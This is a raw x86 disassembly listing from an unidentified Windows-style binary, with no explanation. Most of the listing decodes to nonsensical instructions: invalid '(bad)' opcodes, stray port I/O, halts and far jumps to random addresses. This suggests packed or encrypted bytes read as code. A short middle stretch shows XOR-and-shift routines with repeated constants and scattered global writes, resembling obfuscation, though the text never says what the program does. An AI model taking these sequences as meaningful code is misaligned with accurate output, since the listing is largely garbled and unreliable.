  40a3b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3b6:	sub    al,0xd8
  40a3b8:	push   eax
  40a3b9:	sbb    bl,BYTE PTR [eax]
  40a3bb:	(bad)  
  40a3bc:	fidivr DWORD PTR [edi]
  40a3be:	mov    ah,0x95
  40a3c0:	pop    ebx
  40a3c1:	inc    ebx
  40a3c2:	cmp    eax,0xb6264081
  40a3c7:	mov    esi,0xbeeffe82
  40a3cc:	add    eax,0x84b9b05d
  40a3d1:	or     edx,DWORD PTR [eiz*8-0x6212db7f]
  40a3d8:	std    
  40a3d9:	ds inc ebx
  40a3db:	pop    ds
  40a3dc:	add    ecx,eax
  40a3de:	lea    ecx,[esi]
  40a3e0:	xlat   BYTE PTR ds:[ebx]
  40a3e1:	repnz push es
  40a3e3:	fwait
  40a3e4:	mov    ebp,0x57b8da7d
  40a3e9:	and    al,0xa4
  40a3eb:	cmp    al,0x84
  40a3ed:	ret    0x292e
  40a3f0:	pusha  
  40a3f1:	mov    esi,0x3f050ef0
  40a3f6:	call   0xbcd7:0x5f82c187
  40a3fd:	sbb    DWORD PTR [ebx],edi
  40a3ff:	mov    al,ds:0xea7649fa
  40a404:	jg     0x40a3e3
  40a406:	and    bh,BYTE PTR [edi-0x516aa50]
  40a40c:	pop    edx
  40a40d:	dec    ecx
  40a40e:	add    eax,0x49e3dcc0
  40a413:	sbb    cl,BYTE PTR [esi-0x4a5010bc]
  40a419:	xchg   ecx,eax
  40a41a:	sbb    al,0x0
  40a41c:	and    BYTE PTR [edx+0x1d],ah
  40a41f:	sbb    al,0xd2
  40a421:	pop    edx
  40a422:	xchg   cl,bl
  40a424:	or     esp,esp
  40a426:	cmp    ah,bh
  40a428:	daa    
  40a429:	int3   
  40a42a:	cdq    
  40a42b:	hlt    
  40a42c:	jmp    0xb9f:0x40def72d
  40a433:	sub    BYTE PTR [ebx+edx*2+0x3f3d2d3b],0x35
  40a43b:	js     0x40a3c2
  40a43d:	and    bl,bl
  40a43f:	hlt    
  40a440:	pop    ss
  40a441:	sub    al,0xb
  40a443:	pusha  
  40a444:	add    al,0xf8
  40a446:	ins    BYTE PTR es:[edi],dx
  40a447:	and    al,0x0
  40a449:	jb     0x40a46c
  40a44b:	and    BYTE PTR [edx-0x556cbd33],ch
  40a451:	je     0x40a4cc
  40a453:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a456:	enter  0x4ba0,0x59
  40a45a:	sbb    eax,0x917fc5d7
  40a45f:	add    dl,BYTE PTR [ebp+0xe5f614c]
  40a465:	xchg   esi,eax
  40a466:	ret    
  40a467:	out    dx,al
  40a468:	pop    ebx
  40a469:	aaa    
  40a46a:	dec    ebx
  40a46b:	dec    esi
  40a46c:	ret    
  40a46d:	clc    
  40a46e:	retf   
  40a46f:	call   0xe66c:0x9d92da2a
  40a476:	les    edi,FWORD PTR ds:[eax]
  40a479:	dec    eax
  40a47a:	xchg   ecx,eax
  40a47b:	idiv   DWORD PTR [ebx]
  40a47d:	jl     0x40a43d
  40a47f:	(bad)  
  40a480:	aas    
  40a481:	jecxz  0x40a4be
  40a483:	loope  0x40a449
  40a485:	sub    al,BYTE PTR [bx+0x7ab2]
  40a48a:	push   esi
  40a48b:	cli    
  40a48c:	retf   0x25cf
  40a48f:	bnd jl 0x40a48d
  40a492:	not    BYTE PTR [edx+0xc]
  40a495:	pop    edx
  40a496:	aad    0x1e
  40a498:	xlat   BYTE PTR ds:[ebx]
  40a499:	add    al,dl
  40a49b:	pop    esi
  40a49c:	cmp    bl,BYTE PTR [edx]
  40a49e:	repnz bound edi,QWORD PTR [edx+0x37]
  40a4a2:	sub    al,0x1
  40a4a4:	add    eax,0xda6de36d
  40a4a9:	inc    eax
  40a4aa:	xor    edi,DWORD PTR [ebx-0x3fb2ba8c]
  40a4b0:	add    al,0x88
  40a4b2:	ficomp WORD PTR [edi+0x26]
  40a4b5:	add    BYTE PTR [eax+0x5823b78],ah
  40a4bb:	repnz jecxz 0x40a4cb
  40a4be:	mov    dh,0x64
  40a4c0:	inc    esp
  40a4c1:	(bad)  
  40a4c2:	ret    0x2d4f
  40a4c5:	es inc edx
  40a4c7:	pop    ds
  40a4c8:	mov    cl,0x98
  40a4ca:	loopne 0x40a4dd
  40a4cc:	mov    DWORD PTR [edx+0x52],0xd61052d9
  40a4d3:	pushf  
  40a4d4:	sub    DWORD PTR [eax+ecx*4+0x4c],ecx
  40a4d8:	mov    dh,0xf
  40a4da:	mov    ah,0x38
  40a4dc:	arpl   WORD PTR [ebx],bp
  40a4de:	loope  0x40a526
  40a4e0:	jmp    0x40a4e1
  40a4e2:	jne    0x40a481
  40a4e4:	cmp    bl,al
  40a4e6:	add    BYTE PTR [esi-0x45b0ac2c],ch
  40a4ec:	jmp    DWORD PTR [ecx-0x57]
  40a4ef:	arpl   bx,di
  40a4f1:	pusha  
  40a4f2:	lock in eax,dx
  40a4f4:	imul   al
  40a4f6:	mov    DWORD PTR es:[eax],0x8b068b00
  40a4fd:	dec    esi
  40a4fe:	add    al,0xf
  40a500:	lods   al,BYTE PTR ds:[esi]
  40a501:	enter  0xc102,0xe9
  40a505:	add    al,cl
  40a507:	jmp    0x6e2:0x7af1811e
  40a50e:	out    0x51,eax
  40a510:	xor    eax,edi
  40a512:	jmp    0x40a8f0
  40a517:	sbb    al,0x3d
  40a519:	jmp    0x40a4ee
  40a51b:	jmp    0x9189:0x511a1c23
  40a522:	jo     0x40a57b
  40a524:	or     ch,BYTE PTR [edi+0x182bd8b0]
  40a52a:	sbb    BYTE PTR [esi-0x36e7e7ee],bl
  40a530:	adc    esi,DWORD PTR [ecx+esi*1+0x2]
  40a534:	xor    ah,BYTE PTR [ebp+0x29]
  40a537:	pop    ss
  40a538:	lock hlt 
  40a53a:	push   eax
  40a53b:	jnp    0x40a4be
  40a53d:	vpminub ymm1,ymm0,YMMWORD PTR [ecx+eax*1+0x3a]
  40a543:	inc    ebx
  40a544:	push   0xffffffea
  40a546:	xor    BYTE PTR [esi],0x26
  40a549:	dec    ecx
  40a54a:	mov    ?,WORD PTR [ecx+0x6c107ec4]
  40a550:	(bad)  
  40a551:	shl    DWORD PTR [ecx-0x68289c3b],cl
  40a557:	inc    bh
  40a559:	pop    ecx
  40a55a:	push   ss
  40a55b:	inc    esi
  40a55c:	outs   dx,BYTE PTR ds:[esi]
  40a55d:	mov    ebx,DWORD PTR [edx]
  40a55f:	stc    
  40a560:	xchg   ecx,eax
  40a561:	push   cs
  40a562:	push   esi
  40a563:	mov    ds:0x33d49389,eax
  40a568:	inc    esi
  40a569:	(bad)  
  40a56a:	mov    eax,ds:0xbd91265e
  40a56f:	push   edi
  40a570:	add    al,0xb2
  40a572:	sub    BYTE PTR [edi-0x65],dh
  40a575:	shl    BYTE PTR [edx+eax*8-0x69],1
  40a579:	jmp    0x3b7c75a5
  40a57e:	sub    bl,0x3c
  40a581:	sar    BYTE PTR [edi],0xf
  40a584:	push   cs
  40a585:	(bad)  
  40a586:	push   cs
  40a587:	pop    ebp
  40a588:	mov    cl,0x9a
  40a58a:	dec    edi
  40a58b:	repz (bad) 
  40a58d:	clc    
  40a58e:	js     0x40a5cb
  40a590:	mov    ecx,0xf7381950
  40a595:	mov    DWORD PTR [ecx+0x2acde82b],0x26f98ba5
  40a59f:	mov    esi,0xaf6c201c
  40a5a4:	(bad)  
  40a5a5:	cmc    
  40a5a6:	out    dx,al
  40a5a7:	xchg   ebx,eax
  40a5a8:	cmc    
  40a5a9:	fist   DWORD PTR [ecx+0x104a8c18]
  40a5af:	(bad)  
  40a5b0:	aas    
  40a5b1:	xchg   ebx,eax
  40a5b2:	stc    
  40a5b3:	mov    esp,DWORD PTR [eax+eax*2-0x58d9d5b0]
  40a5ba:	inc    ecx
  40a5bb:	(bad)  
  40a5bc:	lahf   
  40a5bd:	jmp    0x40a62c
  40a5bf:	inc    ebp
  40a5c0:	pusha  
  40a5c1:	xchg   edx,esp
  40a5c3:	outs   dx,DWORD PTR ds:[esi]
  40a5c4:	mov    ds:0x9f7a2317,eax
  40a5c9:	xchg   esp,eax
  40a5ca:	push   ebp
  40a5cb:	inc    ecx
  40a5cc:	js     0x40a5f0
  40a5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5cf:	mov    ah,0xfc
  40a5d1:	ins    DWORD PTR es:[edi],dx
  40a5d2:	fcmovb st,st(2)
  40a5d4:	dec    BYTE PTR [edi-0x75a5d55f]
  40a5da:	stc    
  40a5db:	jo     0x40a5be
  40a5dd:	cmp    ah,bh
  40a5df:	neg    BYTE PTR [esi+0x41ed2ab1]
  40a5e5:	cld    
  40a5e6:	mov    esi,0xbeaa6039
  40a5eb:	adc    BYTE PTR [eax-0x7ba05a25],bl
  40a5f1:	sahf   
  40a5f2:	sbb    dh,BYTE PTR [edi+0x3c]
  40a5f5:	pop    ebp
  40a5f6:	inc    edx
  40a5f7:	sub    al,0xe8
  40a5f9:	lock or DWORD PTR [edi-0x7d29bbcd],esi
  40a600:	xlat   BYTE PTR ds:[ebx]
  40a601:	dec    BYTE PTR [esi-0x306685fb]
  40a607:	loope  0x40a60d
  40a609:	xchg   ebp,eax
  40a60a:	outs   dx,DWORD PTR ds:[esi]
  40a60b:	into   
  40a60c:	xchg   esi,eax
  40a60d:	xchg   ebx,eax
  40a60e:	mov    eax,DWORD PTR [edi]
  40a610:	mov    al,ds:0xfc651f2e
  40a615:	mov    bl,0xec
  40a617:	mov    ebp,0x1dbfe457
  40a61c:	push   edi
  40a61d:	hlt    
  40a61e:	enter  0xbd37,0xea
  40a622:	push   ss
  40a623:	jle    0x40a694
  40a625:	scas   al,BYTE PTR es:[edi]
  40a626:	imul   ebp,DWORD PTR [esi-0x80],0xf3b66089
  40a62d:	jo     0x40a61d
  40a62f:	adc    al,0x88
  40a631:	sub    dh,BYTE PTR [ecx+0x32]
  40a634:	dec    ebx
  40a635:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a636:	and    ch,bh
  40a638:	pusha  
  40a639:	aam    0x84
  40a63b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a63c:	into   
  40a63d:	push   ebp
  40a63e:	add    al,0x69
  40a640:	dec    ebx
  40a641:	xor    ebx,DWORD PTR [ebx]
  40a643:	jge    0x40a604
  40a645:	xchg   ebx,eax
  40a646:	xor    BYTE PTR [ecx+ebp*1],dl
  40a649:	sub    ebx,DWORD PTR [esi-0x3c]
  40a64c:	mov    ebx,0x681cf976
  40a651:	je     0x40a665
  40a653:	int3   
  40a654:	test   dh,bh
  40a656:	inc    eax
  40a657:	sbb    eax,0xddf8ca4
  40a65c:	mov    ecx,0x92b9f8d5
  40a661:	lods   eax,DWORD PTR ds:[esi]
  40a662:	mov    ebp,0xdfe5e006
  40a667:	pop    es
  40a668:	push   ss
  40a669:	xchg   edx,eax
  40a66a:	and    edi,edx
  40a66c:	or     eax,0x9d16041
  40a671:	and    dh,al
  40a673:	push   ss
  40a674:	mov    dh,0x3b
  40a676:	fist   DWORD PTR [edi]
  40a678:	push   0x3a
  40a67a:	mov    eax,0x7d000f8
  40a67f:	lahf   
  40a680:	push   esi
  40a681:	cli    
  40a682:	ud2    
  40a684:	xchg   BYTE PTR [ecx-0x76],dh
  40a687:	dec    ebx
  40a688:	mov    ecx,0x672162af
  40a68d:	xor    eax,0xc7d8539
  40a692:	push   esi
  40a693:	enter  0xfec7,0x69
  40a697:	inc    ebp
  40a698:	bound  ebp,QWORD PTR [eax-0x262c5acd]
  40a69e:	xor    DWORD PTR [ebp-0x6c895329],esi
  40a6a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6a5:	ret    
  40a6a6:	add    al,0x8
  40a6a8:	loop   0x40a6df
  40a6aa:	lar    ebx,WORD PTR [ebp+ebx*1+0x6]
  40a6af:	adc    DWORD PTR [edi+eiz*1],esi
  40a6b2:	rol    BYTE PTR [ebx+0x3d],0x77
  40a6b6:	sub    eax,0x8d2dcecc
  40a6bb:	and    al,0x6a
  40a6bd:	loope  0x40a69d
  40a6bf:	test   DWORD PTR [ecx-0x65],edi
  40a6c2:	popa   
  40a6c3:	add    al,0x2b
  40a6c5:	vmovntpd YMMWORD PTR [ebx],ymm5
  40a6c9:	lds    esi,FWORD PTR [edi]
  40a6cb:	jmp    0xb49c:0x4d892894
  40a6d2:	je     0x40a6b9
  40a6d4:	fisubr DWORD PTR [ebx+0xc7cbbd8]
  40a6da:	mov    bh,0xc1
  40a6dc:	xchg   edi,eax
  40a6dd:	sbb    al,0x75
  40a6df:	sub    edx,DWORD PTR [edx]
  40a6e1:	mov    ds:0xcff3cbc2,eax
  40a6e6:	xchg   esi,eax
  40a6e7:	push   0x37cf517c
  40a6ec:	cwde   
  40a6ed:	jge    0x40a6ab
  40a6ef:	out    0x7,eax
  40a6f1:	fistp  DWORD PTR [ebx+0x26]
  40a6f4:	sub    ah,dl
  40a6f6:	cmp    al,0xbe
  40a6f8:	call   0xd6da184e
  40a6fd:	xor    dl,0x9e
  40a700:	lock sub al,0xff
  40a703:	pop    edx
  40a704:	jg     0x40a6ee
  40a706:	xor    DWORD PTR [ebx-0x34],0x2f0705e9
  40a70d:	pop    ebp
  40a70e:	sar    bl,1
  40a710:	mov    ds:0x5f3c5b33,eax
  40a715:	std    
  40a716:	or     eax,0xfd91122b
  40a71b:	mov    ch,0x6a
  40a71d:	xchg   ebp,eax
  40a71e:	cmp    ebx,esi
  40a720:	xor    edx,edx
  40a722:	add    cl,BYTE PTR [ebx+eax*2-0x3]
  40a726:	push   eax
  40a727:	fild   QWORD PTR [ebp+0x577cf205]
  40a72d:	cmp    al,0x50
  40a72f:	nop
  40a730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a731:	xor    al,0x6d
  40a733:	xor    ebx,DWORD PTR [edi]
  40a735:	pop    esi
  40a736:	cmp    edi,DWORD PTR [ebx+edi*4]
  40a739:	movd   mm0,DWORD PTR gs:[edx+0x5897386c]
  40a741:	(bad)  
  40a742:	jmp    0x3250b4f3
  40a747:	pop    esp
  40a748:	jae    0x40a7bc
  40a74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a74b:	and    eax,0x22714ab5
  40a750:	scas   al,BYTE PTR es:[edi]
  40a751:	sbb    eax,0xf7a82ab
  40a756:	xchg   ebp,eax
  40a757:	jmp    0x40a713
  40a759:	xchg   edx,eax
  40a75a:	sub    bh,al
  40a75c:	jne    0x40a6e7
  40a75e:	inc    esp
  40a75f:	test   BYTE PTR [ebx],cl
  40a761:	lahf   
  40a762:	fmul   DWORD PTR [ebp+0xb]
  40a765:	xor    eax,0x63b5b794
  40a76a:	loopne 0x40a728
  40a76c:	in     al,dx
  40a76d:	or     eax,0xfec8f07e
  40a772:	jle    0x40a747
  40a774:	in     al,0xbf
  40a776:	(bad)  
  40a777:	arpl   bp,ax
  40a779:	inc    esi
  40a77a:	pop    es
  40a77b:	(bad)  
  40a77d:	dec    edx
  40a77e:	sbb    BYTE PTR [esi+ecx*8+0x4dad839a],dh
  40a785:	jle    0x40a7cb
  40a787:	outs   dx,BYTE PTR ds:[esi]
  40a788:	xchg   DWORD PTR [edx-0x4550aee8],esi
  40a78e:	xchg   al,dl
  40a790:	pop    ebx
  40a791:	jae    0x40a7c9
  40a793:	inc    eax
  40a794:	std    
  40a795:	adc    edx,DWORD PTR [ebp-0x29adb6ab]
  40a79b:	cs xchg edx,esi
  40a79e:	pop    ebx
  40a79f:	ret    
  40a7a0:	jecxz  0x40a816
  40a7a2:	pop    DWORD PTR fs:[ecx+0x478d3f9e]
  40a7a9:	dec    ebx
  40a7aa:	(bad)  
  40a7ab:	leave  
  40a7ac:	and    bl,BYTE PTR [edx-0x5]
  40a7af:	into   
  40a7b0:	jmp    0xdfb7e43e
  40a7b5:	iret   
  40a7b6:	cmp    eax,0x29ce3d5b
  40a7bb:	ss test eax,0x676310f5
  40a7c1:	je     0x40a7a7
  40a7c3:	sbb    bl,dh
  40a7c5:	push   DWORD PTR [edx]
  40a7c7:	fsubr  DWORD PTR [ecx+0x51]
  40a7ca:	icebp  
  40a7cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7cc:	or     BYTE PTR [edx+0x1e0ec4d0],dh
  40a7d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7d3:	inc    ebx
  40a7d4:	loope  0x40a7e4
  40a7d6:	adc    ch,BYTE PTR [esi+0x42c66471]
  40a7dc:	imul   esi,DWORD PTR [eax],0xffffffa0
  40a7df:	or     al,0x88
  40a7e1:	retf   
  40a7e2:	add    edi,ebp
  40a7e4:	mov    eax,ds:0x874257f5
  40a7e9:	jo     0x40a809
  40a7eb:	jge    0x40a7d2
  40a7ed:	xor    esp,DWORD PTR [ecx+0x9]
  40a7f0:	dec    ecx
  40a7f1:	xor    edi,eax
  40a7f3:	xor    eax,ecx
  40a7f5:	into   
  40a7f6:	aad    0x67
  40a7f8:	cdq    
  40a7f9:	retf   0x9d3a
  40a7fc:	fstp   QWORD PTR ds:0xe6a31968
  40a802:	mov    edi,0x1555a4d8
  40a807:	aas    
  40a808:	(bad)  
  40a809:	(bad)  
  40a80a:	cmp    cl,ah
  40a80c:	pop    es
  40a80d:	fnstcw WORD PTR [esi-0x105a66b]
  40a813:	(bad)  
  40a814:	cmp    eax,eax
  40a816:	retf   0xa7bd
  40a819:	inc    esp
  40a81a:	xchg   ebx,eax
  40a81b:	ins    BYTE PTR es:[edi],dx
  40a81c:	adc    DWORD PTR [edx-0x22],edx
  40a81f:	pop    eax
  40a820:	int    0xa1
  40a822:	add    ecx,DWORD PTR [eax]
  40a824:	sub    bh,BYTE PTR [esi]
  40a826:	xor    esp,DWORD PTR [ebx-0x27]
  40a829:	mov    eax,0x36cc4bb8
  40a82e:	lahf   
  40a82f:	sar    DWORD PTR [ebx+0x4f],cl
  40a832:	sti    
  40a833:	les    esi,FWORD PTR [edi+0x79]
  40a836:	inc    ebx
  40a837:	nop
  40a838:	scas   eax,DWORD PTR es:[edi]
  40a839:	imul   edx,DWORD PTR [ecx+ebx*4],0x5c6b2dc4
  40a840:	jl     0x40a7e8
  40a842:	dec    edx
  40a843:	rcr    dh,0x2f
  40a846:	aas    
  40a847:	repnz push ds
  40a849:	in     eax,0xb3
  40a84b:	and    DWORD PTR cs:[ebx],esi
  40a84e:	or     BYTE PTR [esp+eiz*8],0x63
  40a852:	push   edx
  40a853:	jb     0x40a7d5
  40a855:	cmc    
  40a856:	dec    esi
  40a857:	scas   eax,DWORD PTR es:[edi]
  40a858:	inc    eax
  40a859:	xchg   ecx,eax
  40a85a:	cmp    al,0x70
  40a85c:	add    eax,0x56ae4fb6
  40a861:	mov    edi,0x7e8c1e3b
  40a866:	sub    edi,DWORD PTR [edx]
  40a868:	stos   DWORD PTR es:[edi],eax
  40a869:	pop    es
  40a86a:	retf   0x565d
  40a86d:	nop
  40a86e:	mov    es,WORD PTR [ebp+0x1e00d77a]
  40a874:	jmp    0x8de51647
  40a879:	sbb    al,0x98
  40a87b:	and    BYTE PTR [eax-0x1b],0xec
  40a87f:	jmp    0x4488:0x81059350
  40a886:	sub    eax,0x25ead7a2
  40a88b:	dec    ebx
  40a88c:	xchg   ebp,eax
  40a88d:	mov    DWORD PTR [edx+0x4c],ebx
  40a890:	dec    ebp
  40a891:	jmp    0xfcc4353d
  40a896:	out    dx,al
  40a897:	test   edx,0xedf84d18
  40a89d:	mov    edx,0x1bf2c624
  40a8a2:	into   
  40a8a3:	adc    DWORD PTR [edx+0x2777437b],edx
  40a8a9:	push   ebp
  40a8aa:	add    ecx,DWORD PTR [ebx-0x13]
  40a8ad:	adc    DWORD PTR [edx+0x32],ebp
  40a8b0:	add    eax,0x72a68ce4
  40a8b5:	out    0xf9,eax
  40a8b7:	add    BYTE PTR [edx+0x28fa0833],dl
  40a8bd:	or     ebp,0x70e37e06
  40a8c3:	lahf   
  40a8c4:	cli    
  40a8c5:	int    0xb7
  40a8c7:	pop    ebx
  40a8c8:	or     eax,0xc7747b63
  40a8cd:	adc    al,0x84
  40a8cf:	ja     0x40a8b0
  40a8d1:	fimul  WORD PTR ds:0x4b98a53e
  40a8d7:	jge    0x40a875
  40a8d9:	cli    
  40a8da:	adc    DWORD PTR [esi+0x38],ebp
  40a8dd:	xchg   ecx,eax
  40a8de:	xor    ebp,DWORD PTR [edi-0x6dd5aaab]
  40a8e4:	out    dx,eax
  40a8e5:	sbb    bl,BYTE PTR ds:0xecdb8aaa
  40a8eb:	cli    
  40a8ec:	xchg   ebx,eax
  40a8ed:	adc    esi,DWORD PTR [eax+0x10558973]
  40a8f3:	mov    edx,DWORD PTR [ebx]
  40a8f5:	mov    edi,DWORD PTR [ebx+0x4]
  40a8f8:	push   eax
  40a8f9:	push   edi
  40a8fa:	push   edx
  40a8fb:	call   0x416c20
  40a900:	shld   edx,eax,0x2
  40a904:	shl    eax,0x2
  40a907:	mov    ecx,eax
  40a909:	or     ecx,DWORD PTR [ebp+0x10]
  40a90c:	xor    eax,eax
  40a90e:	or     edx,eax
  40a910:	xor    ecx,0xca79a575
  40a916:	xor    edx,0x9c1b89e8
  40a91c:	mov    DWORD PTR [esi],ecx
  40a91e:	mov    DWORD PTR [esi+0x4],edx
  40a921:	mov    eax,0x40000000
  40a926:	mov    edx,DWORD PTR [ebx]
  40a928:	mov    ecx,DWORD PTR [ebx+0x4]
  40a92b:	xor    edx,0xca79a577
  40a931:	xor    ecx,0x9c1b89e8
  40a937:	shrd   edx,ecx,0x2
  40a93b:	shr    ecx,0x2
  40a93e:	mov    DWORD PTR [ebp-0x6c],ecx
  40a941:	mov    ecx,DWORD PTR [ebx]
  40a943:	mov    edi,DWORD PTR [ebx+0x4]
  40a946:	mov    edi,ecx
  40a948:	xor    ecx,ecx
  40a94a:	or     ecx,edx
  40a94c:	mov    DWORD PTR [ebp+0x8],ecx
  40a94f:	mov    ecx,DWORD PTR [esi]
  40a951:	mov    edx,DWORD PTR [esi+0x4]
  40a954:	xor    edx,0x9c1b89e8
  40a95a:	xor    ecx,0xca79a577
  40a960:	shl    edi,0x1e
  40a963:	mov    DWORD PTR [ebp+0x14],ecx
  40a966:	mov    ecx,edx
  40a968:	mov    edx,DWORD PTR [ebp+0x14]
  40a96b:	shrd   edx,ecx,0x2
  40a96f:	xor    edi,eax
  40a971:	or     edi,DWORD PTR [ebp-0x6c]
  40a974:	mov    DWORD PTR [ebp-0x70],edx
  40a977:	mov    edx,DWORD PTR [esi]
  40a979:	mov    DWORD PTR [ebp+0xc],edi
  40a97c:	mov    edi,DWORD PTR [esi+0x4]
  40a97f:	shl    edx,0x1e
  40a982:	xor    edi,edi
  40a984:	or     edi,DWORD PTR [ebp-0x70]
  40a987:	shr    ecx,0x2
  40a98a:	xor    edx,eax
  40a98c:	or     edx,ecx
  40a98e:	cmp    edi,DWORD PTR [ebp+0x8]
  40a991:	jne    0x40a9a0
  40a997:	cmp    edx,DWORD PTR [ebp+0xc]
  40a99a:	je     0x40a9b0
  40a9a0:	push   DWORD PTR [ebp+0x20]
  40a9a3:	push   DWORD PTR [ebp+0x1c]
  40a9a6:	push   DWORD PTR [ebp+0x18]
  40a9a9:	push   ebx
  40a9aa:	push   esi
  40a9ab:	call   0x414dd5
  40a9b0:	pop    edi
  40a9b1:	leave  
  40a9b2:	ret    0x1c
  40a9b5:	cmp    cl,0x40
  40a9b8:	mov    DWORD PTR ds:0x4282e3,0x3afd
  40a9c2:	jae    0x40aa0b
  40a9c8:	mov    DWORD PTR ds:0x4282d7,0x7b96
  40a9d2:	cmp    cl,0x20
  40a9d5:	mov    DWORD PTR ds:0x428233,0x3ad8
  40a9df:	jae    0x40a9fb
  40a9e5:	mov    DWORD PTR ds:0x4282db,0x760a
  40a9ef:	shrd   eax,edx,cl
  40a9f2:	not    DWORD PTR ds:0x428263
  40a9f8:	shr    edx,cl
  40a9fa:	ret    
  40a9fb:	add    DWORD PTR ds:0x428257,ecx
  40aa01:	mov    eax,edx
  40aa03:	xor    edx,edx
  40aa05:	and    cl,0x1f
  40aa08:	shr    eax,cl
  40aa0a:	ret    
  40aa0b:	xor    eax,eax
  40aa0d:	xor    edx,edx
  40aa0f:	ret    
  40aa10:	push   ebp
  40aa11:	mov    ebp,esp
  40aa13:	sub    esp,0x30
  40aa16:	mov    DWORD PTR [ebp-0x18],0xca79a575
  40aa1d:	xor    ecx,ecx
  40aa1f:	mov    eax,0x9c1b89e8
  40aa24:	mov    DWORD PTR [ebp-0x14],eax
  40aa27:	not    ecx
  40aa29:	mov    DWORD PTR [ebp-0x30],0xca79a571
  40aa30:	dec    DWORD PTR ds:0x4282d3
  40aa36:	mov    DWORD PTR [ebp-0x2c],eax
  40aa39:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  40aa40:	mov    ecx,DWORD PTR ds:0x42820b
  40aa46:	sbb    DWORD PTR ds:0x42814b,ecx
  40aa4c:	mov    DWORD PTR [ebp-0x24],0x29bd2
  40aa53:	jmp    0x40ae49
  40aa58:	clc    
  40aa59:	sub    dh,BYTE PTR [edx+0x306b2a6b]
  40aa5f:	sub    bh,BYTE PTR ds:0x547e1f6a
  40aa65:	cmp    al,0x29
  40aa67:	stos   BYTE PTR es:[edi],al
  40aa68:	pop    edi
  40aa69:	and    ebx,DWORD PTR [eax]
  40aa6b:	sbb    BYTE PTR [esi+0x12],ch
  40aa6e:	sbb    BYTE PTR [eax],bl
  40aa70:	ror    edi,1
  40aa72:	dec    esi
  40aa73:	daa    
  40aa74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa75:	stos   DWORD PTR es:[edi],eax
  40aa76:	test   bl,ch
  40aa78:	sbb    al,0xa7
  40aa7a:	les    esp,FWORD PTR ds:0x601d4415
  40aa80:	pop    ecx
  40aa81:	aaa    
  40aa82:	test   BYTE PTR [eax-0x464f1b3b],0x20
  40aa89:	(bad)  
  40aa8a:	outs   dx,BYTE PTR ds:[esi]
  40aa8b:	inc    ebp
  40aa8c:	jecxz  0x40aa44
  40aa8e:	test   BYTE PTR [eax],al
  40aa90:	push   ebp
  40aa91:	sbb    eax,0xbc92cb66
  40aa96:	call   0x38e02a64
  40aa9b:	add    eax,0xa5a24428
  40aaa0:	dec    esi
  40aaa1:	and    cl,ch
  40aaa3:	jl     0x40ab12
  40aaa5:	loop   0x40aad8
  40aaa7:	mov    edi,0x5d2e287b
  40aaac:	jle    0x40aa87
  40aaae:	int    0xd3
  40aab0:	jne    0x40aadf
  40aab2:	sub    dh,BYTE PTR [ebx-0x1e385e7e]
  40aab8:	dec    edx
  40aab9:	call   0x7eac:0x1c5d81d0
  40aac0:	dec    edx
  40aac1:	out    dx,al
  40aac2:	sub    al,0x61
  40aac4:	ins    BYTE PTR es:[edi],dx
  40aac5:	jmp    FWORD PTR [edx+0x51]
  40aac8:	jl     0x40aa8e
  40aaca:	popa   
  40aacb:	nop
  40aacc:	dec    esp
  40aacd:	push   ds
  40aace:	js     0x40aad0
  40aad0:	(bad)  
  40aad1:	adc    ebx,DWORD PTR [ebp+0x4918f277]
  40aad7:	cmp    DWORD PTR [esi-0x52630bdf],ecx
  40aadd:	add    bl,dl
  40aadf:	inc    esi
  40aae0:	inc    esp
  40aae1:	xchg   edi,eax
  40aae2:	jl     0x40aaf1
  40aae4:	aad    0xf4
  40aae6:	fisttp QWORD PTR [esi+0x65]
  40aae9:	cmp    esi,DWORD PTR [ebx-0x770a725c]
  40aaef:	(bad)  
  40aaf0:	or     eax,0x8b6dea6d
  40aaf5:	jmp    0x40ab5b
  40aaf7:	mov    edi,0x1992fea4
  40aafc:	fistp  WORD PTR [edx]
  40aafe:	push   ds
  40aaff:	or     al,0x75
  40ab01:	cwde   
  40ab02:	cmp    al,0x6c
  40ab04:	xor    bh,BYTE PTR [esi]
  40ab06:	jns    0x40aa8a
  40ab08:	dec    ebp
  40ab09:	jno    0x40ab62
  40ab0b:	call   0x88da:0x1fd88c99
  40ab12:	js     0x40ab59
  40ab14:	retf   0x4c89
  40ab17:	or     edx,edx
  40ab19:	icebp  
  40ab1a:	sub    eax,0x7f8af33
  40ab1f:	sbb    dl,cl
  40ab21:	loopne 0x40ab58
  40ab23:	cmp    ecx,DWORD PTR [esi]
  40ab25:	sub    DWORD PTR [edx],0xdc5268dd
  40ab2b:	test   eax,0x18f6cd0f
  40ab30:	push   edx
  40ab31:	or     DWORD PTR [esi+0x79],esp
  40ab34:	std    
  40ab35:	cmp    eax,DWORD PTR [edx+eiz*4]
  40ab38:	or     esp,DWORD PTR [eax]
  40ab3a:	inc    eax
  40ab3b:	push   ebp
  40ab3c:	sbb    al,0xba
  40ab3e:	stos   BYTE PTR es:[edi],al
  40ab3f:	adc    al,0x57
  40ab41:	test   al,0x41
  40ab43:	mov    ecx,0x2c161bfa
  40ab48:	jmp    0x40ab4e
  40ab4a:	outs   dx,BYTE PTR ds:[esi]
  40ab4b:	or     BYTE PTR [ecx],bh
  40ab4d:	adc    al,0x34
  40ab4f:	lds    edx,FWORD PTR [ecx+0x433f9897]
  40ab55:	xor    dh,BYTE PTR [ecx]
  40ab57:	cmp    dl,0x23
  40ab5a:	gs ja  0x40ab1a
  40ab5d:	lock popf 
  40ab5f:	mov    edi,0xa48ef030
  40ab64:	into   
  40ab65:	mov    ah,0x5
  40ab67:	cmp    DWORD PTR [ecx-0x74eb9820],ebx
  40ab6d:	xor    eax,0x38a0db2f
  40ab72:	cmp    eax,0xd182a2ce
  40ab77:	mov    ebx,0x436c37de
  40ab7c:	adc    ah,BYTE PTR [eax+edi*8-0x173a87de]
  40ab83:	iret   
  40ab84:	push   esp
